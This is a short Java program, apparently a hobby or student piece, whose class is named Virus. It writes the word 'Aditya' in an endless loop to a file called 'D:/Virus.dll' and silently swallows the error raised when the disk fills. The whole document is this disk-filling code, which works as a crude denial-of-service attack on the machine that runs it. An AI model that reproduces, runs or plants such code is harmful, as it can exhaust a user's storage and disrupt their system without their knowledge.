package Reading_File;

import java.io.*;
class Virus
{
    public static void main(String args [])
    {
        try
        {
            FileWriter f=new FileWriter("D:/Virus.dll");
            while(true)
            {
                f.write("Aditya");
            }
        }
        catch(Exception e)
        {
        }
    }
}